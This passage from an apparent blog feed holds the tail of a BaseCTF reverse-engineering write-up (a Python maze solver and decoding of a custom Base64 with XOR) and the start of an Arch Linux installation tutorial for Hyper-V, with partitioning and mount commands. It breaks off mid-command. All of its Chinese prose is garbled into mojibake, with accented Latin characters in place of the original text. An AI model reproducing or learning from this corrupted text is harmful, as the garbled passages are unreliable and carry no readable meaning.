å’Œ<code>&amp;</code>ã€‚æ•°ä¸€ä¸‹æ˜¯225ä¸ªï¼ŒçŒœæƒ³15*15çš„è¿·å®«ï¼Œæ‰‹åŠ¨æ¢è¡Œã€‚çœ‹èµ·æ¥<code>&amp;</code> åƒæ˜¯è·¯ï¼Œæ‰‹åŠ¨æ›¿æ¢ã€‚èµ°è·¯å¹¶æ‰‹åŠ¨èµ°è·¯ã€‚</p><p>éªŒè¯ä¸€ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>maze = <span class="hljs-string">&quot;x$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$$$$$$$$$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$$$$$$&amp;$$&amp;$$$$$$$$$$$&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&quot;</span><br>pos = <span class="hljs-number">0</span><br><br>steps = <span class="hljs-string">&quot;sssssssddddwwwddsssssssdddsssddddd&quot;</span><br><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> steps:<br>    <span class="hljs-keyword">match</span> <span class="hljs-built_in">ord</span>(step):<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">100</span>:<br>            <span class="hljs-keyword">if</span> pos%<span class="hljs-number">15</span> == <span class="hljs-number">14</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">115</span>:<br>            <span class="hljs-keyword">if</span> pos &gt; <span class="hljs-number">209</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos += <span class="hljs-number">15</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">119</span>:<br>            <span class="hljs-keyword">if</span> pos &lt;= <span class="hljs-number">14</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos -= <span class="hljs-number">15</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">97</span>:<br>            <span class="hljs-keyword">if</span> pos%<span class="hljs-number">15</span> == <span class="hljs-number">0</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(maze[pos]) == <span class="hljs-number">36</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">ord</span>(maze[pos]) == <span class="hljs-number">121</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BaseCTF&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(hashlib.md5(steps.encode()).hexdigest()))<br></code></pre></td></tr></table></figure><h3 id="baseplus">BasePlus</h3><p>å…¶å®ä¹Ÿæ˜¯æ²¡æœ‰å®Œå…¨çœ‹æ‡‚ä»£ç ï¼Œä½†æ˜¯çœ‹åˆ°äº†ç¼–ç çš„å…¶ä¸­ä¸€æ®µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v17[<span class="hljs-number">0</span>] = Secret[(<span class="hljs-type">unsigned</span> __int8)v15 &gt;&gt; <span class="hljs-number">2</span>];<br>v17[<span class="hljs-number">1</span>] = Secret[(HIBYTE(v15) &gt;&gt; <span class="hljs-number">4</span>) | (<span class="hljs-number">16</span> * (_BYTE)v15) &amp; <span class="hljs-number">0x30</span>];<br>v17[<span class="hljs-number">2</span>] = Secret[(v16 &gt;&gt; <span class="hljs-number">6</span>) | (<span class="hljs-number">4</span> * HIBYTE(v15)) &amp; <span class="hljs-number">0x3C</span>];<br>v17[<span class="hljs-number">3</span>] = Secret[v16 &amp; <span class="hljs-number">0x3F</span>];<br></code></pre></td></tr></table></figure><p>å› ä¸ºå‰æ®µæ—¶é—´æ— èŠï¼Œæ‰‹å†™äº†ä¸€æ¬¡Base64ç¼–ç ï¼Œå¯¹è¿™æ®µä½è¿ç®—æœ‰ç‚¹çœ¼ç†Ÿï¼Œç„¶åçœ‹çœ‹ Secretï¼Œå¥½åƒæ˜¯è‡ªå®šä¹‰ Base64ç¼–ç é›†åˆã€‚CyberChefè¯•ä¸€ä¸‹å‘ç°å±…ç„¶æ˜¯æœ‰åæœ‰å§“çš„ï¼Œå«ä»€ä¹ˆAtom128ã€‚ä½†æ˜¯è§£ç ä¸å¯¹ï¼Œçœ‹èµ·æ¥ä¸åŸå§‹ä¿¡æ¯å·®äº†ä¸€äº›ï¼Œç»§ç»­çœ‹ä»£ç å‘ç°è¿˜æœ‰å¼‚æˆ–ï¼Œå†è¯•ä¸€ä¸‹å°±<ahref="https://gchq.github.io/CyberChef/#recipe=XOR(%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;E&#39;%7D,&#39;Standard&#39;,false)From_Base64(&#39;/128GhIoPQROSTeUbADfgHijKLM%2Bn0pFWXY456xyzB7%3D39VaqrstJklmNuZvwcdEC&#39;,true,false)&amp;input=bHZmekJpWmlPdzc8bGhGOGRET2ZFYm1JXWlAYmRjWmZFY156PmFEIQ">è§£å‡ºæ¥äº†</a>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*(_BYTE *)(dst + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br></code></pre></td></tr></table></figure><h2 id="ç»“å°¾">ç»“å°¾</h2><p>è¡¥é¢˜ï¼åšæ¯•è®¾ï¼</p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨</category>
      
      <category>ç«èµ›</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨ Hyper-V ä¸­å®‰è£… Archlinuxï¼ˆä¸Šï¼‰</title>
    <link href="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/"/>
    <url>/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ—¢æ˜¯ä¸€ç¯‡ Hyper-V å®‰è£…è™šæ‹Ÿæœºçš„æ•™ç¨‹ï¼Œä¹Ÿæ˜¯ä¸€ç¯‡å®‰è£… Archlinuxçš„æ•™ç¨‹ã€‚</p><span id="more"></span><p>Archlinux å‘æ¥ä»¥â€œéš¾å®‰è£…â€è‘—ç§°ï¼Œä¸€ç›´ä»¥æ¥æ˜¯æˆ‘å¿ƒå¤´çš„ç™½æœˆå…‰ã€‚æ›¾ç»ç”¨ <ahref="https://github.com/arch-linux-gui">Arch Liunx GUI</a>å®‰è£…è¿‡ä¸€æ¬¡å¹¶ä¸”ç”¨äº†å¾ˆä¹…ï¼Œä½†æ˜¯ä»å‘½ä»¤è¡Œå®‰è£…è¿˜çœŸçš„æ²¡æœ‰å®Œæ•´å°è¯•è¿‡ï¼ŒåŠ ä¹‹Archlinux åœ¨å®˜æ–¹ç½‘ç«™ä¸Šæä¾›äº†<ahref="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">å®‰è£…æŒ‡å—</a>ï¼Œæ‰€ä»¥å†ä¸€æ¬¡å°è¯•ä¸€ä¸‹Archlinux çš„å®‰è£…ã€‚</p><p>å…ˆå»æä¸€ä¸ª <ahref="https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/">Archlinuxé•œåƒ</a></p><h2 id="åˆ›å»ºä¸é…ç½®è™šæ‹Ÿæœº">åˆ›å»ºä¸é…ç½®è™šæ‹Ÿæœº</h2><h3 id="hyper-v-ç®¡ç†å™¨æ¦‚è§ˆ">Hyper-V ç®¡ç†å™¨æ¦‚è§ˆ</h3><p>æ‰“å¼€ <strong>Hyper-V ç®¡ç†å™¨</strong>ï¼Œç•Œé¢å¦‚å›¾1-1æ‰€ç¤º</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-1.png" class="" title="Hyper-V ç®¡ç†å™¨ç•Œé¢"><p>å¯ä»¥çœ‹åˆ°ç•Œé¢é™¤äº†èœå•æ å¤–ä¸»è¦åˆ†ä¸ºå·¦ä¸­å³ä¸‰æ </p><ul><li>å·¦æ ä¸º Hyper-V ç®¡ç†æœåŠ¡å™¨åˆ—è¡¨ï¼Œå¯ä»¥æ·»åŠ è¿œç¨‹ç®¡ç†å™¨ã€‚å›¾ä¸­åªæœ‰æœ¬åœ°Hyper-V ç®¡ç†å™¨ã€‚</li><li>ä¸­æ ä¸ºå½“å‰ç®¡ç†å™¨ä¸‹ç®¡ç†çš„è™šæ‹Ÿæœºï¼Œè™šæ‹Ÿæœºçš„æ£€æŸ¥ç‚¹ï¼ˆå¿«ç…§ï¼‰ï¼Œè™šæ‹Ÿæœºçš„è¯¦ç»†ä¿¡æ¯ç­‰ä¸‰è¡Œæ¶ˆæ¯ã€‚å›¾ä¸­å¯ä»¥çœ‹åˆ°å·²ç»æœ‰ä¸¤ä¸ªè™šæ‹Ÿæœº<code>i3wm-demo</code> å’Œ <code>mininet</code>äº†ï¼ˆå®ƒä»¬ä¼šåœ¨åé¢çš„æ–‡ç« ä¸­å‡ºç°ï¼‰ã€‚</li><li>å³æ ä¸ºæ“ä½œæ ï¼Œå¯¹é€‰å®šçš„è™šæ‹Ÿæœºå¯ä»¥æ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚</li></ul><p>è¯ä¸å¤šè¯´ï¼Œæˆ‘ä»¬å¼€å§‹å§ã€‚</p><h3 id="åˆ›å»ºè™šæ‹Ÿæœº">åˆ›å»ºè™šæ‹Ÿæœº</h3><ol type="1"><li><p>åœ¨å³æ ä¸­é€‰æ‹©â€œæ–°å»ºâ†’è™šæ‹Ÿæœºâ†’ä¸‹ä¸€æ­¥â€è®¾ç½®è™šæ‹Ÿæœºåç§°å’Œå‚¨å­˜çš„ä½ç½®ï¼Œå‹¾é€‰â€œå°†è™šæ‹Ÿæœºå­˜å‚¨åœ¨å…¶ä»–ä½ç½®â€åå¯ä»¥é€‰æ‹©ä¸€ä¸ªCç›˜ä»¥å¤–çš„ä½ç½®ï¼ˆå»ºè®®å‹¾é€‰ï¼Œåˆ«æŠŠCç›˜æ’‘çˆ†ï¼‰ã€‚å¦‚å›¾1-2-1æ‰€ç¤ºã€‚</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-1.png" class="" title="æŒ‡å®šåç§°å’Œä½ç½®"></p></li><li><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œé€‰æ‹©è™šæ‹Ÿæœºç‰ˆæœ¬ï¼Œ1ä»£ Hyper-Vè™šæ‹Ÿæœºæ˜¾ç„¶æ˜¯æ²¡äºŒä»£å¥½å‘€ï¼Œé€‰äºŒä»£ã€‚å¦‚å›¾1-2-2æ‰€ç¤º</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-2.png" class="" title="é€‰æ‹©è™šæ‹Ÿæœºç‰ˆæœ¬"></p></li><li><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œè®¾ç½®è™šæ‹Ÿæœºå†…å­˜å¤§å°ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†6GBä¹Ÿå°±æ˜¯6144MBå†…å­˜ã€‚å¦‚å›¾1-2-3æ‰€ç¤º</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-3.png" class="" title="åˆ†é…å†…å­˜"></p></li><li><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œè®¾ç½®è™šæ‹Ÿæœºçš„ç½‘ç»œã€‚é»˜è®¤è®¾ç½®ä¸­ï¼Œè™šæ‹Ÿæœºå­˜åœ¨ä¸€ä¸ªç½‘å¡ï¼Œåœ¨åé¢çš„è®¾ç½®ä¸­å¯ä»¥æ·»åŠ ç½‘å¡ã€‚é»˜è®¤è®¾ç½®ä¸­åªæœ‰<code>Default Switch</code>ä¸€ä¸ªäº¤æ¢æœºï¼Œæ‰€ä»¥å°±è¿æ¥åˆ°å®ƒã€‚å¦‚å›¾1-2-4æ‰€ç¤º</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-4.png" class="" title="è¿æ¥ç½‘å¡"></p><blockquote><p>åœ¨åç»­çš„å®éªŒä¸­ï¼Œæˆ‘ä»¬ä¼šåˆ›å»ºæ–°çš„äº¤æ¢æœºä»¥åŠæ–°çš„ç½‘å¡æ¥æ»¡è¶³éš”ç¦»ã€ç»„ç½‘ç­‰éœ€æ±‚ã€‚</p></blockquote></li><li><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œåˆ›å»ºè™šæ‹Ÿç£ç›˜ï¼Œè¯¥ç£ç›˜å°±æ˜¯è™šæ‹Ÿæœºçš„ç£ç›˜äº†ã€‚é»˜è®¤åç§°å’Œä½ç½®å°±å¥½ï¼Œæ”¹ä¸€ä¸‹å¤§å°ä¸º32Gï¼Œå› ä¸ºå°±æ˜¯åšå®éªŒå˜›è¿™ä¹ˆå¤§å¤Ÿäº†ï¼Œè¦æ˜¯ç”µè„‘å­˜å‚¨ä¸å¤Ÿï¼Œ8Gä¹Ÿèƒ½å¯¹ä»˜ï¼Œå†å°‘å°±ä¸å¤ªå¥½äº†ã€‚å¦‚å›¾1-2-5æ‰€ç¤º</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-5.png" class="" title="åˆ›å»ºè™šæ‹Ÿç£ç›˜"></p></li><li><p>ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œé€‰æ‹©å®‰è£…ä»‹è´¨ï¼Œè¿™é‡Œå°±é€‰æ‹©æˆ‘ä»¬åˆšåˆšä¸‹è½½çš„ Archlinuxé•œåƒã€‚å¦‚å›¾1-2-6æ‰€ç¤ºã€‚</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-6.png" class="" title="é€‰æ‹©å®‰è£…ä»‹è´¨"></p></li></ol><p>æœ€åï¼Œç‚¹å‡»â€œä¸‹ä¸€æ­¥â†’å®Œæˆâ€å³å¯å®Œæˆè™šæ‹Ÿåˆ›å»ºã€‚</p><h3 id="è®¾ç½®è™šæ‹Ÿæœº">è®¾ç½®è™šæ‹Ÿæœº</h3><p>ä½ å…ˆåˆ«æ€¥ï¼Œè¿™é‡Œè¿˜éœ€è¦å‡ æ­¥é…ç½®æ‰èƒ½å¯åŠ¨è™šæ‹Ÿæœºï¼Œä¸ç„¶åé¢æœ‰ä½ æ€¥çš„</p><ol type="1"><li><p>ä¸­æ é€‰ä¸­æ–°åˆ›å»ºçš„è™šæ‹Ÿæœº<code>archlinux-demo</code>ï¼Œåœ¨å³æ ä¸­é€‰æ‹©è®¾ç½®ï¼Œé€‰æ‹©â€œå®‰å…¨â€ï¼Œå–æ¶ˆâ€œå¯ç”¨å®‰å…¨å¯åŠ¨â€çš„å‹¾é€‰ï¼Œç‚¹å‡»å³ä¸‹è§’â€œåº”ç”¨â€ä¿å­˜è®¾ç½®ã€‚å¦‚å›¾1-3æ‰€ç¤º</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-3.png" class="" title="ç¦ç”¨å®‰å…¨å¯åŠ¨"></p><blockquote><p>è¿™æ˜¯å®‰è£… Linux ç³»ç»Ÿéœ€è¦çš„æ“ä½œï¼Œè‡³äºå®‰è£… Windows å’Œ MacOSï¼Œä»¥åŠå¯åŠ¨Linuxç³»ç»Ÿæ˜¯å¦å¯ä»¥æ‰“å¼€ï¼Œå¤§å®¶å¯ä»¥å°è¯•ä¸€ä¸‹</p></blockquote></li></ol><h2 id="å®‰è£…-archlinux">å®‰è£… Archlinux</h2><p>Archlinuxï¼Œå¯åŠ¨ï¼ï¼ˆå¹¶è¿æ¥ï¼‰</p><p>Archlinux å®‰è£…çš„è¿‡ç¨‹åœ¨<ahref="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">å®‰è£…æŒ‡å—</a>åŠå…¶é™„å¸¦çš„é“¾æ¥ä¸­æœ‰è¯¦ç»†çš„å™è¿°ï¼Œä½†æ˜¯æ–‡ç« è¿‡äºå†—é•¿ã€‚æœ¬æ–‡ç€é‡è®°å½•å…¶ä¸­çš„å…³é”®æ­¥éª¤ï¼Œå…³é”®æ­¥éª¤æŒ‰é¡ºåºåŒ…æ‹¬ï¼š</p><ol type="1"><li>è¿æ¥äº’è”ç½‘å¹¶æ›´æ–°ç³»ç»Ÿæ—¶é—´</li><li>åˆ›å»ºå¹¶æ ¼å¼åŒ–ç¡¬ç›˜åˆ†åŒº</li><li>è®¾ç½®é•œåƒå¹¶å®‰è£…ç³»ç»Ÿ</li><li>é…ç½®ç³»ç»Ÿ</li></ol><h3 id="è¿æ¥äº’è”ç½‘å¹¶é…ç½®æ—¶é—´">è¿æ¥äº’è”ç½‘å¹¶é…ç½®æ—¶é—´</h3><p>ä¸ Ubuntuã€Debian çš„å®‰è£…ä»‹è´¨ä¸åŒï¼ŒArchlinux å®‰è£…å…‰ç›˜å¹¶ä¸åŒ…å« Linuxç³»ç»Ÿçš„ç›¸å…³ç»„ä»¶ï¼Œæ‰€ä»¥éœ€è¦ä»äº’è”ç½‘ä¸‹è½½ï¼Œé‚£ä¹ˆè¿æ¥äº’è”ç½‘æ˜¯å®‰è£…ç³»ç»Ÿçš„åŸºç¡€ã€‚</p><p>åœ¨ç‰©ç†æœºä¸Šè¿æ¥äº’è”ç½‘æœ‰æ—¶å€™å¹¶ä¸æ˜¯ä¸€ä»¶å¾ˆè½»æ¾çš„äº‹æƒ…ï¼Œç‰¹åˆ«æ˜¯å½“äº’è”ç½‘æœåŠ¡éœ€è¦Webè®¤è¯çš„æ—¶å€™ï¼ˆæ ¡å›­ç½‘ï¼šæŠ¥æˆ‘èº«ä»½è¯å·å¾—äº†ï¼‰ã€‚ç„¶è€Œåœ¨è™šæ‹Ÿæœºä¸­å€’æ˜¯ç›¸å½“ç®€å•ï¼ŒHyper-Vçš„é»˜è®¤äº¤æ¢æœºæä¾›äº† NAT åŠŸèƒ½ï¼Œåªéœ€è¦è™šæ‹Ÿæœºé€šè¿‡ DHCP è·å– IPå³å¯è¿æ¥åˆ°äº’è”ç½‘ã€‚è€Œ Archlinux å®‰è£…ç³»ç»Ÿåœ¨å¯åŠ¨è¿‡ç¨‹ä¸­å°±å¯åŠ¨äº† DHCPæœåŠ¡å™¨ï¼Œæ‰€ä»¥ä¸€åˆ‡éƒ½ä¸ç”¨é…ç½®ã€‚å¦‚æœä¸æ”¾å¿ƒï¼Œå¯ä»¥ä½¿ç”¨ <code>ip link</code>æŸ¥çœ‹ç½‘å¡çš„ IP åœ°å€æƒ…å†µï¼Œä»¥åŠä½¿ç”¨ <code>ping bing.com</code>ç¡®è®¤æ˜¯å¦çœŸçš„èƒ½è”ç½‘ã€‚</p><p>è”ç½‘ååº”å½“ä½¿ç”¨ NTPæœåŠ¡åŒæ­¥æ—¶é—´ï¼Œå› ä¸ºä¸€äº›é•œåƒç«™åœ¨æœ¬åœ°æ—¶é—´ï¼ˆè™šæ‹Ÿæœºçš„æ—¶é—´ï¼‰ä¸ç³»ç»Ÿæ—¶é—´ï¼ˆé•œåƒç«™çš„æ—¶é—´ï¼‰å·®åˆ«è¿‡å¤§çš„æ—¶å€™ï¼Œæ— æ³•åŒæ­¥æ¶ˆæ¯ã€‚å‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚å›¾2-1æ‰€ç¤ºï¼š</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-1.png" class="" title="åŒæ­¥æ—¶é—´"><h3 id="åˆ›å»ºå¹¶æ ¼å¼åŒ–ç¡¬ç›˜åˆ†åŒº">åˆ›å»ºå¹¶æ ¼å¼åŒ–ç¡¬ç›˜åˆ†åŒº</h3><p>è¿™æ˜¯ Archlinuxç”šè‡³æ‰€æœ‰æ“ä½œç³»ç»Ÿä¸å¯æˆ–ç¼ºçš„ä¸€æ­¥ã€‚ä¸»è¦åˆ†ä¸ºï¼šå¯»æ‰¾å¯ç”¨è®¾å¤‡ã€åˆ’åˆ†åˆ†åŒºã€æ ¼å¼åŒ–åˆ†åŒºä¸‰æ­¥ã€‚</p><ol type="1"><li><p>å¯»æ‰¾å¯ç”¨è®¾å¤‡</p><p>è¦æŸ¥æ‰¾ç³»ç»Ÿä¸­å¯ç”¨çš„å­˜å‚¨è®¾å¤‡ï¼Œä½¿ç”¨ <code>fdisk -l</code>å¯ä»¥çœ‹åˆ°ä¸€äº›è®¾å¤‡ï¼Œå…¶ä¸­ç»“æœä¸­ä»¥ <code>rom</code>ã€<code>loop</code> æˆ–è€…<code>airootfs</code> ç»“å°¾çš„è®¾å¤‡å¯ä»¥è¢«å¿½ç•¥ã€‚ç»“æœä¸­ä»¥<code>rpbm</code>ã€<code>boot0</code> æˆ–è€… <code>boot1</code> ç»“å°¾çš„<code>mmcblk*</code> è®¾å¤‡ä¹Ÿå¯ä»¥è¢«å¿½ç•¥ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä»¥ <code>sd*</code>æˆ–è€… <code>nvme*</code> ç»“å°¾ã€‚è¿è¡Œç»“æœå¦‚å›¾2-2-1æ‰€ç¤ºï¼š</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-1.png" class="" title="å¯»æ‰¾å¯ç”¨è®¾å¤‡"></p></li><li><p>åˆ’åˆ†åˆ†åŒº</p><p>å…¶æ¬¡ï¼Œä½¿ç”¨åˆ†åŒºå·¥å…·åœ¨ç£ç›˜çš„ç©ºä½™ç©ºé—´ä¸Šåˆ’åˆ†åˆ†åŒºã€‚å¯¹äº Linuxç³»ç»Ÿè€Œè¨€ï¼Œè‡³å°‘éœ€è¦ï¼šä¸€ä¸ªæ ¹åˆ†åŒºï¼Œç”¨äºæŒ‚è½½æ ¹ç›®å½•ï¼›å¯¹äº UEFIå¯åŠ¨æ¨¡å¼ï¼Œä¸€ä¸ªEFIç³»ç»Ÿåˆ†åŒºã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥è®¾ç½®ç£ç›˜é˜µåˆ—ç­‰åŠŸèƒ½ï¼Œå®ç°æ›´å¤šç‰¹æ€§ã€‚ç„¶è€Œæœ¬å®éªŒä¸­å¹¶ä¸éœ€è¦è¿™æ ·å¤šçš„ç‰¹æ€§ï¼Œæœ¬æ–‡ä¸­è§„åˆ’äº†ä¸‰ä¸ªåˆ†åŒºï¼š</p><table><thead><tr class="header"><th>åˆ†åŒº</th><th>æŒ‚è½½ç‚¹</th><th>ç±»å‹</th><th>åˆ†åŒºå¤§å°</th></tr></thead><tbody><tr class="odd"><td><code>/dev/sda1</code></td><td><code>/boot</code></td><td>EFIç³»ç»Ÿåˆ†åŒº</td><td>1G</td></tr><tr class="even"><td><code>/dev/sda2</code></td><td><code>/</code></td><td>Linux Root (x86_64)</td><td>16G</td></tr><tr class="odd"><td><code>/dev/sda3</code></td><td><code>/home</code></td><td>Linuxæ–‡ä»¶ç³»ç»Ÿ</td><td>å‰©ä½™ç©ºé—´</td></tr></tbody></table><p>ä½¿ç”¨ <code>cfdisk</code> å¯¹ç£ç›˜æ‰§è¡Œåˆ†åŒºï¼ˆLinux Root(x86_64)ä¹Ÿå¯ä»¥æ¢æˆLinuxæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œç»“æœå¦‚å›¾2-2-2æ‰€ç¤ºï¼š</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-2.png" class="" title="åˆ’åˆ†åˆ†åŒºç•Œé¢"></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-3.png" class="" title="åˆ’åˆ†åˆ†åŒºç»“æœ"></p></li><li><p>æ ¼å¼åŒ–åˆ†åŒº</p><p>æœ€åï¼Œæ ¼å¼åŒ–å„ä¸ªåˆ†åŒºï¼Œåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿã€‚æ–‡ä»¶ç³»ç»Ÿæ˜¯ç»„ç»‡æ–‡ä»¶æ•°æ®çš„æ–¹å¼ï¼Œä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿæœ‰ä¸åŒçš„ç‰¹ç‚¹ã€‚å¯¹äºè¿™é‡Œæ‰€åˆ†çš„ä¸‰ä¸ªåˆ†åŒºï¼Œè®¾ç½®å¦‚ä¸‹æ–‡ä»¶ç³»ç»Ÿï¼š</p><table><thead><tr class="header"><th>åˆ†åŒº</th><th>æ–‡ä»¶ç³»ç»Ÿ</th><th>è¯´æ˜</th></tr></thead><tbody><tr class="odd"><td><code>/dev/sda1</code></td><td>fat32</td><td>EFIç³»ç»Ÿåˆ†åŒºå¿…é¡»æ˜¯fat32æ–‡ä»¶ç³»ç»Ÿ</td></tr><tr class="even"><td><code>/dev/sda2</code></td><td>ext4</td><td>Linux é»˜è®¤æ–‡ä»¶ç³»ç»Ÿï¼Œå„æ–¹é¢å±æ€§å¾ˆå‡åŒ€</td></tr><tr class="odd"><td><code>/dev/sda3</code></td><td>ext4</td><td></td></tr></tbody></table><p>å‘½ä»¤å¦‚ä¸‹ï¼Œè¿è¡Œç»“æœå¦‚å›¾2-2-4æ‰€ç¤ºï¼š</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfs.ext4 /dev/sda2<br>mkfs.ext4 /dev/sda3<br>mkfs.fat -F 32 /dev/sda1<br></code></pre></td></tr></table></figure></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-4.png" class="" title="æ ¼å¼åŒ–åˆ†åŒº"></p></li></ol><h3 id="é…ç½®é•œåƒå¹¶å®‰è£…ç³»ç»Ÿ">é…ç½®é•œåƒå¹¶å®‰è£…ç³»ç»Ÿ</h3><p>å‰é¢è¯´åˆ° Archlinux å®‰è£…éœ€è¦è¿æ¥ç½‘ç»œä¸‹è½½ Linux ç›¸å…³çš„æ–‡ä»¶ã€‚è€ŒArchlinuxæä¾›çš„é•œåƒè¿œåœ¨æµ·å¤–ï¼Œå³ä½¿æ²¡æœ‰ä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œä¸‹è½½é€Ÿåº¦ä¹Ÿä¼šå¤§æ‰“æŠ˜æ‰£ï¼Œæ‰€ä»¥éœ€è¦é…ç½®ä¸€ä¸‹é•œåƒã€‚è¿™é‡Œæˆ‘ä½¿ç”¨äº†æ¸…åå¤§å­¦å¼€æºé•œåƒç«™çš„Archlinux é•œåƒï¼Œ<ahref="https://mirrors.tuna.tsinghua.edu.cn/help/archlinux/">ç‚¹å‡»</a>è·å–é…ç½®æ•™ç¨‹ã€‚</p><p>æ¥ç€å°±è¯¥å°† Archlinuxå®‰è£…åˆ°ç£ç›˜ä¸­äº†ã€‚åœ¨å®‰è£…ä¹‹å‰éœ€è¦å°†å®‰è£…ç³»ç»Ÿçš„ç£ç›˜æŒ‚è½½åˆ°ç³»ç»Ÿä¸­ï¼Œä¸”ä¸€å®šè¦æŒ‰ç…§å±‚çº§é¡ºåºæŒ‚è½½ç›®å½•ï¼Œå¦åˆ™ä¼šå‡ºç°æ— æ³•è®¿é—®ç›®å½•çš„æƒ…å†µã€‚ä»¥ä¸‹æ˜¯æŒ‚è½½çš„å‘½ä»¤:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount /dev/sda2 /mnt<br>mount --mkdir /dev/sda1 /mnt/boot<br>mount --mkdir /dev/sda3 